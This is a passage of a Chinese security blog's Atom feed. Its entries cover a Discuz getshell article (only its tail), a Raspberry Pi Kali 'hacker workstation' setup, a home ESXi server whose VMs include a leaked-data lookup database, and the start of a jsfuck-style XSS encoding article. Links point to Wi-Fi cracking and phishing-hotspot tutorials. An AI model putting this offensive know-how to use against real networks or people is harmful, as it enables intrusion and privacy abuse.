class=&quot;pln&quot;&gt;    }&lt;/span&gt;</code><br>100.101.  <code>&lt;span class=&quot;pln&quot;&gt;}&lt;/span&gt;</code><br>102.  <code>&lt;span class=&quot;pun&quot;&gt;?&amp;gt;&lt;/span&gt;</code></pre></div><div><br></div><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div&gt;&lt;pre class=&quot;prettyprint linenums prettyprinted&quot;&gt;&lt;br&gt;&lt;br&gt;1.  &lt;font color=&quot;#93a1a1&quot;&gt;注意事项：dz6.0 uc_key getshell 是因为 xml标签解析函数和加密函数改动变动，改动相
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>怎样用树莓派和Kali Linux构建便携式黑客工作站</title>
    <link href="https://tycx2ry.github.io/2015/11/03/e6-80-8e-e6-a0-b7-e7-94-a8-e6-a0-91-e8-8e-93-e6-b4-be-e5-92-8ckali-linux-e6-9e-84-e5-bb-ba-e4-be-bf-e6-90-ba-e5-bc-8f-e9-bb-91-e5-ae-a2-e5-b7-a5-e4-bd-9c-e7-ab-99/"/>
    <id>https://tycx2ry.github.io/2015/11/03/e6-80-8e-e6-a0-b7-e7-94-a8-e6-a0-91-e8-8e-93-e6-b4-be-e5-92-8ckali-linux-e6-9e-84-e5-bb-ba-e4-be-bf-e6-90-ba-e5-bc-8f-e9-bb-91-e5-ae-a2-e5-b7-a5-e4-bd-9c-e7-ab-99/</id>
    <published>2015-11-03T06:10:00.000Z</published>
    <updated>2018-02-26T06:03:06.148Z</updated>
    
    <content type="html"><![CDATA[<!--StartFragment--><p><strong><span style="font-size:16.0pt">怎样用树莓派和<span lang="EN-US">Kali Linux</span>构建便携式黑客工作站<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></strong></p><p><span lang="EN-US">0x01</span>工欲善其事，必先利其器</p><!--[if !supportLists]--><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;1.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->树莓派（<span lang="EN-US">B+</span>或<span lang="EN-US">2</span>）<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;2.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]--><span lang="EN-US">5V</span>充电宝一枚<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;3.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]--><span lang="EN-US">WIFI</span>模块<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;4.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]--><span lang="EN-US">8g SD</span>卡<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;5.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]--><span lang="EN-US">PiTFT</span>触屏<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;6.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->键盘<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;7.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->保护壳<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;8.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->桌面电脑（平台初始化安装工作）<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span lang="EN-US">0x02 </span>在树莓派上安装<span lang="EN-US">kali</span><br><br><!--[if !supportLists]--><span lang="EN-US">1.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->详细安装流程<span lang="EN-US">: &lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span lang="EN-US"><a href="http://lifehacker.com/5976912/a-beginners-guide-to-diying-with-the-raspberry-pi#_ga=1.265570311.968941705.1436971740" target="_blank" rel="noopener">http://lifehacker.com/5976912/a-beginners-guide-to-diying-with-the-raspberry-pi#_ga=1.265570311.968941705.1436971740</a>&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">2.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->怎样用<span lang="EN-US">windows</span>安装<span lang="EN-US">kali</span>到你的<span lang="EN-US">SD</span>卡（简略版）<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">a)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->下载<span lang="EN-US"><a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/" target="_blank" rel="noopener">Kali<br>Linux Raspberry TFT image</a></span>并解压获得里面的<span lang="EN-US">.img</span>文件。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br>注意：加入你没有触屏，请下载<span lang="EN-US"><a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/" target="_blank" rel="noopener">regular</a></span>版本。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">b)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->下载<span lang="EN-US"><a href="https://launchpad.net/win32-image-writer/+download" target="_blank" rel="noopener">Win32DiskImager</a></span>并解压获得安装文件<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">c)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->用读卡器插你的<span lang="EN-US">SD</span>卡进<span lang="EN-US">PC&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">d)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->打开<span lang="EN-US">Win32DiskImager.exe</span>（<span lang="EN-US">win7</span>和<span lang="EN-US">win8</span>等请用管理员权限打开）<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">e)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->加入<span lang="EN-US">SD</span>卡没有被识别，可以点击菜单栏中的<span lang="EN-US">Device</span>选项选择<span lang="EN-US">SD</span>卡<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">f)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->在工具的镜像文件选择区，选择你下载的<span lang="EN-US">.img</span>镜像<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">g)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->点击<span lang="EN-US">write</span>按钮，写入镜像<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">3.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->在<span lang="EN-US">OS X</span>系统上安装<span lang="EN-US">kali</span>进<span lang="EN-US">SD</span>卡<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">a)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->下载<span lang="EN-US"><a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/" target="_blank" rel="noopener">Pi<br>TFT</a></span>镜像并解压获得<span lang="EN-US">.img</span>文件，同理如果没有屏幕请下载<span lang="EN-US"><a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/" target="_blank" rel="noopener">regular</a></span>镜像<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">b)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->下载<span lang="EN-US"><a href="http://alltheware.wordpress.com/2012/12/11/easiest-way-sd-card-setup" target="_blank" rel="noopener">RPi-sd<br>card builder</a></span>并解压<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">c)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->插<span lang="EN-US">SD</span>卡到你额<span lang="EN-US">Mac&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">d)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->打开<span lang="EN-US">RPi-SD</span>并加载<span lang="EN-US">.img</span>镜像<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">e)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->检测<span lang="EN-US">SD</span>卡是否被加载，输入管理员密码（加载<span lang="EN-US">SD</span>卡得时候有弹框需要输入）<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">f)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->双击挂在盘，弹出盘，别直接拔掉<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">g)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->然后插入到树莓派<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">4.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->安装显示屏<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span lang="EN-US"><!--[if gte vml 1]><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"> <v:stroke joinstyle="miter"/> <v:formulas>  <v:f eqn="if lineDrawn pixelLineWidth 0"/>  <v:f eqn="sum @0 1 0"/>  <v:f eqn="sum 0 0 @1"/>  <v:f eqn="prod @2 1 2"/>  <v:f eqn="prod @3 21600 pixelWidth"/>  <v:f eqn="prod @3 21600 pixelHeight"/>  <v:f eqn="sum @0 0 1"/>  <v:f eqn="prod @6 1 2"/>  <v:f eqn="prod @7 21600 pixelWidth"/>  <v:f eqn="sum @8 21600 0"/>  <v:f eqn="prod @7 21600 pixelHeight"/>  <v:f eqn="sum @10 21600 0"/> </v:formulas> <v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/> <o:lock v:ext="edit" aspectratio="t"/></v:shapetype><v:shape id="图片_x0020_1" o:spid="_x0000_i1025" type="#_x0000_t75" style='width:415pt;height:234pt;visibility:visible;mso-wrap-style:square'> <v:imagedata src="file://localhost/Users/ln/Library/Group%20Containers/UBF8T346G9.Office/msoclip1/01/clip_image001.png"  o:title=""/></v:shape><![endif]--><!--[if !vml]--></span><br><div><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/11/wpid-2000ee704385794db98912cd02056c2e_37cdb303-bab1-4239-9f13-4e3885fa65bc.png" alt=""></div><br><br>显示屏安装特别方便，由于树莓派有<span lang="EN-US">GPIO</span>（通用输入输出）针脚，直接插上就好。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">5.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->插上<span lang="EN-US">wifi</span>、键盘并通电<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br>固定好显示器以后，我们接上其他的几个硬件（<span lang="EN-US">wifi</span>、键盘、充电宝）。由于树莓派提供了<span lang="EN-US">4</span>个<span lang="EN-US">usb</span>接口，因此插上<span lang="EN-US">wifi</span>和键盘完全没有问题。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br>然后就等待启动，树莓派期待有点慢，耐心等待，成功期待会停留在一个登陆界面。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">6.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->开启<span lang="EN-US">wifi&lt;o:p&gt;&lt;/o:p&gt;</span><br><br>现在我们登陆系统，开启<span lang="EN-US">wifi</span>，这样就能很好的使用<span lang="EN-US">kali</span>里面的工具了，<span lang="EN-US">kali</span>将自动识别<span lang="EN-US">wifi</span>模块，然后你连接你自己的<span lang="EN-US">wifi</span>热点。首先，我们需要在<span lang="EN-US">kali</span>上确认几件事：<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">a)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->你的用户和密码是<span lang="EN-US">root</span>和<span lang="EN-US">toor&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">b)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->你可以使用键盘和显示屏超控你的树莓派了，并打开一个命令行<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">c)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->然后设置<span lang="EN-US">wifi</span>，用<span lang="EN-US">nano</span>工具打开<span lang="EN-US">/etc/network/interfaces&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">d)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->增加如下文本：<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span lang="EN-US">auto wlan0 iface<br>wlan0 inet dhcp wpa-ssid “your network name” wpa-psk “the network password”&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>编辑完成使用<span lang="EN-US">Ctrl+X</span>保存，现在你的<span lang="EN-US">wifi</span>应该可以正常工作了（如果不能工作你可以重启一下）<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">7.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->改变密码<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br>在你使用它之前请确保你是修改了密码（虽然很少有人有同样的<span lang="EN-US">hack</span>能力，但如果遇到了，被搞了就不好了）。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">a)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->在命令行下输入<span lang="EN-US">passwd</span>，并按<span lang="EN-US">enter</span>键<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">b)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->输入新密码并确认<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">c)<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->输入<span lang="EN-US">dpkg-reconfigure<br>openssh-server</span>并按<span lang="EN-US">Enter&lt;o:p&gt;&lt;/o:p&gt;</span><br><br>现在你的小型便携式系统设置加固完成<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span lang="EN-US">8.<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span><!--[endif]-->你能用这个设备干什么<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br>至此你的小型便携式黑客工作站就设置完成了，你可以使用它安装你想要的程序，如果你不知道怎么使用它，下面有一些好的使用案例：<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><!--[if !supportLists]--><span class="MsoHyperlink"><span lang="EN-US" style="font-family: Wingdings;">l<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span></span><!--[endif]--><span lang="EN-US"><a href="https://www.raspberrypi.org/documentation/remote-access/ssh/" target="_blank" rel="noopener"><span lang="ZH-CN">用</span>ssh<span lang="ZH-CN">连接树莓派</span>&lt;o:p&gt;&lt;/o:p&gt;</a></span><br><br><!--[if !supportLists]--><span class="MsoHyperlink"><span lang="EN-US" style="font-family: Wingdings;">l<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span></span><!--[endif]--><span lang="EN-US"><a href="http://lifehacker.com/5633909/who-needs-a-mouse-learn-to-use-the-command-line-for-almost-anything" target="_blank" rel="noopener"><span lang="ZH-CN">学习基础命令行</span>&lt;o:p&gt;&lt;/o:p&gt;</a></span><br><br><!--[if !supportLists]--><span class="MsoHyperlink"><span lang="EN-US" style="font-family: Wingdings;">l<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span></span><!--[endif]--><span lang="EN-US"><a href="http://www.lifehacker.co.uk/2014/10/25/hack-network-beef-security-kali-linux" target="_blank" rel="noopener"><span lang="ZH-CN">破解</span>wifi<span lang="ZH-CN">密码，常见钓鱼热点，和流量劫持</span>&lt;o:p&gt;&lt;/o:p&gt;</a></span><br><br><!--[if !supportLists]--><span class="MsoHyperlink"><span lang="EN-US" style="font-family: Wingdings;">l<span style="font-size: 7pt; font-family: 'Times New Roman';"></span></span></span><!--[endif]--><span lang="EN-US"><a href="http://www.lifehacker.co.uk/2014/10/25/tap-network-see-everything-happens" target="_blank" rel="noopener"><span lang="ZH-CN">监视网络中得流量</span>&lt;o:p&gt;&lt;/o:p&gt;</a></span><br><br><!--[if !supportLists]--><span lang="EN-US" style="font-family:Wingdings;mso-fareast-font-family:Wingdings;mso-bidi-font-family:Wingdings">l<span style="font-size: 7pt; font-family: 'Times New Roman';">&nbsp;&nbsp; </span></span><!--[endif]--><span lang="EN-US"><a href="http://go.redirectingat.com/?id=92X1507373&amp;site=lifehacker.co.uk&amp;xs=1&amp;isjs=1&amp;url=http%3A%2F%2Fwww.kalitutorials.net%2F2013%2F08%2Fkali-linux.html&amp;xguid=&amp;xuuid=cefa8f66bac5461928201109d2e8145f&amp;xsessid=&amp;xcreo=0&amp;xed=0&amp;sref=http%3A%2F%2Fwww.lifehacker" target="_blank" rel="noopener"><span lang="ZH-CN">更多的</span>kali<span lang="ZH-CN">指导</span></a>&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span lang="EN-US">“</span><span lang="EN-US" style="color: rgb(51, 51, 51); background-position: initial initial; background-repeat: initial initial;">The world is your oyster.<br>Hack responsibly, everyone.</span><span lang="EN-US">”</span><span lang="EN-US" style="font-family:&quot;Times New Roman&quot;;mso-fareast-font-family:&quot;Times New Roman&quot;;mso-font-kerning:0pt">&lt;o:p&gt;&lt;/o:p&gt;</span><br><!--EndFragment--><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--StartFragment--&gt;
&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-size:16.0pt&quot;&gt;怎样用树莓派和&lt;span lang=&quot;EN-US&quot;&gt;Kali Linux&lt;/span&gt;构建便携式黑客工作站&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;o
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>如何搭建个人服务器</title>
    <link href="https://tycx2ry.github.io/2015/10/19/e5-a6-82-e4-bd-95-e6-90-ad-e5-bb-ba-e4-b8-aa-e4-ba-ba-e6-9c-8d-e5-8a-a1-e5-99-a8/"/>
    <id>https://tycx2ry.github.io/2015/10/19/e5-a6-82-e4-bd-95-e6-90-ad-e5-bb-ba-e4-b8-aa-e4-ba-ba-e6-9c-8d-e5-8a-a1-e5-99-a8/</id>
    <published>2015-10-19T12:23:49.000Z</published>
    <updated>2018-02-26T06:02:58.287Z</updated>
    
    <content type="html"><![CDATA[<p><font face="微软雅黑">&nbsp; &nbsp; 为了方便随时随地都可以搞站，又不想实时都背一个特重的笔记本。轻薄性的笔记本性能又跟不上，所以我们可以在家里放一个个人服务器。</font></p><div><font face="微软雅黑">“工欲善其事，必先利其器”</font></div><div><font face="微软雅黑"><br></font></div><div><font face="微软雅黑">硬件：intel NUC（配置自选）</font></div><div><font face="微软雅黑"><br></font></div><div><font face="微软雅黑">软件：vmware exsi 6.0</font></div><div><font face="微软雅黑"><br></font></div><div><font face="微软雅黑">1.获取vmware exsi 6.0镜像</font></div><div><font face="微软雅黑">&nbsp; &nbsp;原文： <a href="http://www.virten.net/2015/03/esxi-6-0-image-for-intel-nuc/（文中提供3中方法，下文这种经测试最好用）" target="_blank" rel="noopener">http://www.virten.net/2015/03/esxi-6-0-image-for-intel-nuc/（文中提供3中方法，下文这种经测试最好用）</a><br></font></div><div><br><br>1.  Download and extraxt&nbsp;<a href="http://www.v-front.de/p/esxi-customizer.html" target="_blank" rel="noopener">ESXi-Customizer</a><br>2.  Download required packages (Place both files in C:\esx)<a href="https://my.vmware.com/group/vmware/get-download?downloadGroup=PCLI600R1" target="_blank" rel="noopener"></a>–&nbsp;<a href="https://my.vmware.com/group/vmware/details?downloadGroup=ESXI600&amp;productId=491&amp;rPId=7501" target="_blank" rel="noopener">ESXi 6.0 ESXi ISO image</a>&nbsp;(VMware-VMvisor-Installer-6.0.0-2494585.x86_64.iso)<br>–&nbsp;<a href="http://vibsdepot.v-front.de/depot/bundles/sata-xahci-1.28-1-offline_bundle.zip" target="_blank" rel="noopener">Sata-xahci Offline Bundle</a>&nbsp;(Provided by&nbsp;<a href="https://vibsdepot.v-front.de/wiki/index.php/Sata-xahci" target="_blank" rel="noopener">v-front.de</a>)<br>3.  Run&nbsp;ESXi-Customizer.cmd<br>4.  Select ESXi ISO and Sata-xahci package<br><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/10/wpid-86fffc20fe7299fce153213490212f7e_89cf1bf0-d136-479f-801b-f926bdf752ea.png" alt="ESXi-Customizer-nuc-esxi6"><br>5.  Press&nbsp;<strong>Run!</strong><br>6.  Install ESXi on your NUC with the ISO mentioned in the message<br><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/10/wpid-86fffc20fe7299fce153213490212f7e_51763def-9254-4407-8bf8-98fbe7374575.png" alt="ESXi-Customizer-nuc-esxi6-done"></div>3.用vmware vSphere客户端连接进入创建虚拟机<div><font face="微软雅黑">&nbsp; &nbsp; a.kali_pentest</font><br></div><div><font face="微软雅黑">&nbsp; &nbsp; b.windows7_pentest</font><font face="微软雅黑"><br></font></div><div><font face="微软雅黑">&nbsp; &nbsp; c.社工库</font><font face="微软雅黑"><br></font></div><div><font face="微软雅黑">&nbsp; &nbsp; d.私人云笔记（</font><span style="font-size: 10.5pt; line-height: 1.5;">leanote，集成了博客功能</span><span style="font-family: 微软雅黑; font-size: 10.5pt; line-height: 1.5;">）</span></div><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;font face=&quot;微软雅黑&quot;&gt;&amp;nbsp; &amp;nbsp; 为了方便随时随地都可以搞站，又不想实时都背一个特重的笔记本。轻薄性的笔记本性能又跟不上，所以我们可以在家里放一个个人服务器。&lt;/font&gt;&lt;/p&gt;
&lt;div&gt;&lt;font face=&quot;微软雅黑&quot;&gt;“工欲善其事，必
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>无字母的xss vector构造</title>
    <link href="https://tycx2ry.github.io/2015/10/13/e6-97-a0-e5-ad-97-e6-af-8d-e7-9a-84xss-vector-e6-9e-84-e9-80-a0/"/>
    <id>https://tycx2ry.github.io/2015/10/13/e6-97-a0-e5-ad-97-e6-af-8d-e7-9a-84xss-vector-e6-9e-84-e9-80-a0/</id>
    <published>2015-10-13T07:51:17.000Z</published>
    <updated>2018-02-26T06:03:29.644Z</updated>
    
    <content type="html"><![CDATA[<p><font face="微软雅黑">0x00 前言 &nbsp; &nbsp;</font><div><font face="微软雅黑">今天看见mickey发的一个连接，关于字母js的构造，想起前端时间ctf中的jsfuck，于是写翻译以下，写出来和大家分享。</font></div><div><font face="微软雅黑"><br></font></div><div><font face="微软雅黑">0x01 jsfuck</font></div><div><font face="微软雅黑">jsfuck大家应该都很熟悉了，在ctf中经常出现。</font></div><div><font face="微软雅黑">在线转平台：<a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">http://utf-8.jp/public/jsfuck.html</a></font></div><div><font face="微软雅黑">&nbsp; &nbsp;&nbsp;</font><span style="font-family: 微软雅黑; font-size: 10.5pt; line-height: 1.5;">&nbsp; &nbsp;&nbsp;</span><span style="font-family: 微软雅黑; font-size: 10.5pt; line-height: 1.5;">&nbsp; &nbsp;&nbsp;</span><span style="font-family: 微软雅黑; font-size: 10.5pt; line-height: 1.5;">&nbsp; &nbsp;&nbsp;</span><span style="font-family: 微软雅黑; font-size: 10.5pt; line-height: 1.5;">&nbsp; &nbsp;&nbsp;</span><span style="font-family: 微软雅黑; font-size: 10.5pt; line-height: 1.5;">&nbsp;</span><font face="微软雅黑"><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a></font></div><div><font face="微软雅黑"> </font><br></div><div>编码规则：</div><div><pre class="prettyprint linenums prettyprinted"></pre></div></p><ol><li><code>&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;![]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;kwd&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!![]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;undefined   &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[][[]]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;typ&quot;&gt;NaN&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+[![]]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+[]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+!+[]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!+[]+!+[]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[+!+[]]+[+[]]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;typ&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;       &lt;/span&gt;&lt;span 